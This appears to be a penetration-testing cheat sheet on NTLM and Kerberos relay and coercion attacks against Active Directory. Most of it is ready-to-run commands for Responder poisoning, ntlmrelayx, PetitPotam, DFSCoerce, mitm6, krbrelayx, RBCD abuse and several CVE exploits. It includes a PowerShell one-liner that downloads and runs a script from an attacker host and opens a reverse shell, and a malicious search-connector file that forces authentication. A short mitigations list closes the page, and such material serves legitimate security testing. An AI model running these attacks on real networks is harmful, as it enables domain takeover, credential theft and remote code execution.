# Relay & Coerce

Capture an authentication attempt, then redirect it to a service you control, bypassing the need for a password. On internal networks, relay and coercion attacks can provide a fast path from unauthenticated access to a foothold or domain compromise. They chain from [Responder poisoning](#responder--llmnrnbt-ns-poisoning) and feed directly into [Credential Dumping](credential-dumping.md) and [Lateral Movement](lateral-movement.md).

{% hint style="warning" %}
Relay only works against targets where signing is **not required**. Generate a relay list first (`nxc smb <TARGET>/24 --gen-relay-list`) — burning time relaying to a signed host produces nothing. See the [SMB/LDAP signing matrix](#smb--ldap-signing-status).
{% endhint %}

## Responder — LLMNR/NBT-NS poisoning

The opening move. When a Windows host fails DNS, it broadcasts an LLMNR/NBT-NS query that anyone on the segment can answer. Responder answers, the victim authenticates to you, and you capture an NTLMv2 hash.

```bash
# Poison LLMNR/NBT-NS/MDNS and capture hashes
sudo responder -I eth0 -wv

# Analyze mode — watch traffic without poisoning (recon first, OpSec)
sudo responder -I eth0 -A
```

Captured hashes land in `/usr/share/responder/logs/`. Crack offline with hashcat mode 5600, or — if you don't want to crack — **relay** it instead.

{% hint style="info" %}
To relay, you must turn off Responder's own SMB and HTTP servers so `ntlmrelayx` can bind those ports. Set `SMB = Off` and `HTTP = Off` in `/usr/share/responder/Responder.conf`.
{% endhint %}

## NTLM relay setup

### Find relay targets (SMB signing disabled)

```bash
# NetExec — generate relay target list from a subnet
nxc smb <TARGET>/24 --gen-relay-list relayTargets.txt

# RunFinger — identify machines without SMB signing
python3 RunFinger.py -i <TARGET>/24
```

### ntlmrelayx basic usage

| Goal | Command |
| --- | --- |
| Relay to SMB, dump SAM | `ntlmrelayx.py -tf relayTargets.txt -smb2support` |
| Relay to a specific SMB target + run a command | `ntlmrelayx.py -t smb://<TARGET> -smb2support -c "whoami"` |
| Relay to LDAP, escalate a user | `ntlmrelayx.py -t ldap://<DC_IP> -smb2support --escalate-user '<USER>'` |
| Relay to LDAP, add a computer account | `ntlmrelayx.py -t ldap://<DC_IP> -smb2support --add-computer '<name>$'` |
| SOCKS mode (tunnel relayed sessions) | `ntlmrelayx.py -tf relayTargets.txt -smb2support -socks` |
| Interactive shell | `ntlmrelayx.py -tf relayTargets.txt -smb2support -i` |

### Responder + ntlmrelayx together

```bash
# Terminal 1 — Responder poisons, SMB/HTTP disabled in Responder.conf
sudo responder -I eth0 -wv

# Terminal 2 — relay the captured auth to a signing-disabled target
sudo ntlmrelayx.py -t smb://<TARGET> -smb2support -c "whoami"
```

### RBCD via relay

Resource-Based Constrained Delegation lets a relayed machine account impersonate any user on the target.

```bash
# Relay to LDAP and grant delegation rights to a computer you control
ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access --escalate-user '<name>$'

# Request a service ticket impersonating Administrator
getST.py -spn cifs/<TARGET>.<DOMAIN> -impersonate Administrator \
  -dc-ip <DC_IP> <DOMAIN>/<name>$:<PASS>

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <TARGET>.<DOMAIN>
```

## SMB & LDAP signing status

Relay success depends entirely on what signing the target enforces. Defaults by OS:

| System | SMB Signing | LDAP Signing |
| --- | --- | --- |
| Windows Server 2019 DC | Required | Not Required |
| Windows Server 2022 DC (pre-23H2) | Required | Not Required |
| Windows Server 2022 DC (23H2) | Required | Required |
| Windows Server 2025 DC | Required | Required |
| Windows 10/11 | Not Required | N/A |
| Windows Server 2019/2022 Member | Not Required | N/A |

DCs require SMB signing, so you can't relay SMB→SMB to a DC — but LDAP signing is off by default on older DCs, which is why LDAP relay (add-computer / RBCD / escalate-user) is the go-to against domain controllers.

### Check EPA (Enhanced Protection for Authentication)

EPA validates NTLM channel binding and blocks relay when enforced.

```bash
uv run relayinformer mssql --target <TARGET> --user <USER> --password <PASS>
uv run relayinformer http  --url http://<TARGET>/page --user <USER> --password <PASS>
uv run relayinformer ldap  --method BOTH --dc-ip <DC_IP> --user <USER> --password <PASS>
```

| EPA Value | Meaning |
| --- | --- |
| Disabled / Never | Relay should work regardless of NTLM version |
| Allowed / Accepted | Relay might work if the client supports EPA |
| Required | Relay prevented by EPA validation |

## Coercion — force the auth you want

Poisoning waits for a mistake. Coercion **forces** a target machine to authenticate to you on demand — no waiting, no luck. Pair any coercion trigger with a relay listener.

### WebClient service (needed for HTTP coercion)

```bash
# Check if WebClient is running (enables HTTP → LDAP relay)
nxc smb <TARGET> -u '<USER>' -p '<PASS>' -M webdav
```

WebClient auto-enables when a user maps a WebDAV share, types a non-local path in Explorer, or browses a `.searchConnector-ms` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <simpleLocation>
        <url>http://<ATTACKER_IP>/path</url>
    </simpleLocation>
</searchConnectorDescription>
```

### MS-RPRN (PrinterBug / SpoolSample)

The Print Spooler service can be abused over the LSARPC named pipe to coerce authentication.

```bash
# Check if Spooler is running
nxc smb <TARGET> -u '<USER>' -p '<PASS>' -M spooler

# Impacket rpcdump — look for MS-RPRN / MS-PAR interfaces
rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'

# Trigger via NetExec coerce_plus
nxc smb <TARGET>/24 -u <USER> -p <PASS> -M coerce_plus -o METHOD=PrinterBug
```

### MS-EFSR (PetitPotam)

PetitPotam abuses the EFSRPC interface and was historically triggerable **unauthenticated** against unpatched DCs, making it a powerful no-credentials coercion technique.

```bash
# Unauthenticated (older DCs)
python3 PetitPotam.py <ATTACKER_IP> <TARGET>

# Authenticated
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> -dc-ip <DC_IP> <ATTACKER_IP> <DC_IP>

# Via NetExec
nxc smb <TARGET>/24 -u <USER> -p <PASS> -M coerce_plus -o METHOD=PetitPotam
```

### MS-DFSNM (DFSCoerce)

```bash
python3 dfscoerce.py -u <USER> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
nxc smb <TARGET>/24 -u <USER> -p <PASS> -M coerce_plus -o METHOD=DFSCoerce
```

### MS-WSP (WSPCoerce)

Windows Search Protocol coercion. The `wsearch` service is on by default on workstations, off on servers.

```bash
WSPCoerce.exe <TARGET> <ATTACKER_IP>
wspcoerce '<DOMAIN>/<USER>:<PASS>@<TARGET>' "file:////<ATTACKER_IP>/share"
# Use hostname only (no FQDN) for the target; FQDN/hostname for the listener
```

{% hint style="info" %}
NetExec's `coerce_plus` module bundles PetitPotam, PrinterBug, DFSCoerce, MSEven, and ShadowCoerce. Short forms: `METHOD=PetitPotam` (`pe`), `PrinterBug` (`pr`), `DFSCoerce` (`dfs`); `LISTENER=<ATTACKER_IP>` (`L`). Run `nxc smb <TARGET> -u '' -p '' -M coerce_plus` to scan which triggers are exposed.
{% endhint %}

## Application-level coercion (non-Windows triggers)

Coercion isn't limited to Windows RPC bugs. Any admin UI that lets you set a **UNC path** for a background file operation will make the app's process authenticate to that path — point it at your relay listener and catch it.

### WordPress "Backup Migration" plugin — UNC coerce

**When to use:** you have a compromised WordPress admin (or an exploit granting settings write) plus a relayable NTLM target on the internal network. Chains cleanly from a Kerberoast crack → WP admin → lateral to another Windows host.

Kali side — start ntlmrelayx targeting the signing-disabled host:

```bash
# Build the base64 PowerShell reverse-shell payload (UTF-16LE)
pwsh -c '[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/rev.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 9999"))'

# Relay listener — post-auth command runs on the target as the coerced identity
impacket-ntlmrelayx --no-http-server -smb2support \
  -t smb://<TARGET> \
  -c "powershell -enc <base64>"

# Reverse-shell catcher
nc -nvlp 9999
```

WordPress side — as the WP admin: **Plugins → Backup Migration → Settings**, change the backup location to `\\<ATTACKER_IP>\anything`, and **Save**. When the plugin walks the path it authenticates to you; ntlmrelayx replays it to `<TARGET>` and runs the payload.

**Other UNC-write coercion primitives to try:**

* Jenkins → Global Tool Configuration (Java/Git installer paths)
* SolarWinds Orion → "Copy file" alert action with a UNC destination
* MSSQL `xp_dirtree \\<ATTACKER_IP>\a` (see database exploitation)
* Any CI/CD "artifact archive path" field
* Backup software config: Veeam, Acronis, Duplicati

## NTLM relay attack variants

### LDAP signing not required + channel binding disabled

Requirements: LDAP signing not required (default), channel binding disabled (default), `ms-DS-MachineAccountQuota >= 1` (default 10).

```bash
sudo responder -I eth0 -wv
sudo ntlmrelayx.py -t ldaps://<DC_IP> --add-computer
```

### SMB signing disabled + IPv4 (SOCKS)

```bash
# Disable SMB/HTTP in Responder.conf, then poison + relay via SOCKS
sudo responder -I eth0
sudo ntlmrelayx.py -tf relayTargets.txt -socks -smb2support

# Drive relayed sessions through the SOCKS proxy
proxychains impacket-smbclient //<TARGET>/Users -U <DOMAIN>/<USER>
proxychains impacket-mssqlclient <DOMAIN>/<USER>@<TARGET> -windows-auth
```

### SMB signing disabled + IPv6 (mitm6)

Since MS16-077, WPAD is requested only over DNS. mitm6 takes over IPv6 DNS to become the network's resolver.

```bash
# Terminal 1 — DNS takeover via IPv6 / DHCPv6
mitm6 -i eth0 -d <DOMAIN>

# Terminal 2 — relay NTLM to LDAP
impacket-ntlmrelayx -6 -wh <ATTACKER_IP> -of loot -tf relayTargets.txt
impacket-ntlmrelayx -6 -wh <ATTACKER_IP> -l /tmp -socks -debug
impacket-ntlmrelayx -6 -wh <ATTACKER_IP> -t ldaps://<DC_IP>
```

### Drop the MIC — CVE-2019-1040

Strips the Message Integrity Check from NTLM, enabling SMB→LDAP relay.

```bash
# Check
python2 scanMIC.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'

# Exploit
ntlmrelayx.py --remove-mic --escalate-user <USER> -t ldap://<DC_IP> -smb2support

# Coerce with PrinterBug, then DCSync with the escalated account
python printerbug.py <DOMAIN>/<USER>@<TARGET> <ATTACKER_IP>
secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc
```

### Drop the MIC 2 — CVE-2019-1166

```bash
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user '<name>$' -smb2support --remove-mic --delegate-access
```

### Ghost Potato — CVE-2019-1384

Requirements: user is local Administrator + Backup Operator, elevated token.

```bash
ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
```

### RemotePotato0 (DCOM DCE RPC relay)

Requirements: shell in session 0, privileged user logged into session 1.

```bash
# Terminal 1 — port-forward RPC
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:9998

# Terminal 2 — relay to LDAP
sudo ntlmrelayx.py -t ldap://<DC_IP> --no-wcf-server --escalate-user <USER>

# On the target (session 0):
RemotePotato0.exe -r <ATTACKER_IP> -p 9998 -s 2

# Then move laterally
psexec.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```

### Relay via WebDAV

WebDAV lets you relay an HTTP connection to SMB/LDAP.

```bash
# Terminal 1 — Responder generates the machine name
sudo responder -I eth0

# Terminal 2 — RBCD relay to LDAPS
python3 ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access -smb2support

# Terminal 3 — coerce over WebDAV with PetitPotam
PetitPotam.py "<ATTACKER_NETBIOS>@80/randomfile.txt" "<TARGET>"

# Request the service ticket and access the resource
Rubeus.exe s4u /user:<name>$ /aes256:<KEY> /impersonateuser:Administrator \
  /msdsspn:host/<TARGET>.<DOMAIN> /altservice:cifs /nowrap /ptt
```

## Kerberos relay attacks

### Kerberos relay over HTTP (ADCS)

```bash
# Responder poisons with a different hostname
python3 Responder.py -I eth0 -N <TARGET_NETBIOS>

# krbrelayx relays Kerberos to the ADCS web enrollment endpoint
sudo python3 krbrelayx.py --target 'http://<TARGET>.<DOMAIN>/certsrv/' \
  -ip <ATTACKER_IP> --adcs --template User -debug
```

### Kerberos relay over DNS

Abuses AD Secure Dynamic DNS updates.

```bash
sudo krbrelayx.py --target http://<TARGET>/certsrv/ -ip <ATTACKER_IP> \
  --victim <TARGET>.<DOMAIN> --adcs --template Machine
sudo mitm6 --domain <DOMAIN> --host-allowlist <TARGET>.<DOMAIN> --relay <TARGET>.<DOMAIN> -v
python gettgtpkinit.py -pfx-base64 <B64> <DOMAIN>/<name>$ <name>.ccache
```

### Kerberos reflection — CVE-2025-33073

Relay a machine to itself using crafted DNS records.

```bash
dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' <TARGET> -a add \
  -r <MAGIC_RECORD> -d <ATTACKER_IP>
krbrelayx.py --target smb://<TARGET>.<DOMAIN> -c whoami
petitpotam.py -d <DOMAIN> -u <USER> -p '<PASS>' "<MAGIC_RECORD>" "<TARGET>.<DOMAIN>"

# Also detectable with NetExec
nxc smb <TARGET> -u <USER> -p '<PASS>' -M ntlm_reflection
```

## Mitigations (for the remediation section)

* **Disable LLMNR** — GPO: Computer Config → Admin Templates → Network → DNS Client → *Turn off multicast name resolution* → Enabled
* **Disable NBT-NS** — NIC → IPv4 → Advanced → WINS → *Disable NetBIOS over TCP/IP*
* **Require SMB signing** — GPO: *Microsoft network server: Digitally sign communications (always)*
* **Enable LDAP signing + channel binding** — enforced on Server 2022 23H2+ and Server 2025
* **Enable EPA** — validates channel binding to defeat NTLM relay
* **Patch coercion CVEs** — PetitPotam, PrintNightmare, and the Drop-the-MIC family
* **Reduce `MachineAccountQuota` to 0** — blocks the add-computer step in LDAP relay chains

## Quick reference

| Attack | Tool | Target | Coercion |
| --- | --- | --- | --- |
| LLMNR poison | Responder | Local segment | None (passive) |
| SMB relay | ntlmrelayx | SMB (signing off) | PrinterBug / PetitPotam |
| LDAP relay | ntlmrelayx | LDAP / DC | PrinterBug / PetitPotam |
| Kerberos relay HTTP | krbrelayx | Web / ADCS | LLMNR poison |
| Kerberos relay DNS | krbrelayx + mitm6 | Any DC service | mitm6 poisoning |
| WebDAV relay | ntlmrelayx | LDAP via HTTP | PetitPotam via WebDAV |
| RBCD relay | ntlmrelayx | LDAP | PrinterBug / PetitPotam |

## Related

* [CrackMapExec / NetExec](crackmapexec-netexec.md) — relay lists, coerce checks, spraying relayed creds
* [Mimikatz](mimikatz.md) — turn a relayed admin session into dumped secrets
* [AD Attacks](ad-attacks.md) · [Kerberos Attacks](kerberos-attacks.md) — where RBCD and ADCS relay lead
* [Credential Dumping](credential-dumping.md) · [Password Hash Attacks](password-hash-attacks.md) · [Lateral Movement](lateral-movement.md) — next steps after the relay lands
* [Report Writing](report-writing.md) — turning the relay chain into a rated finding
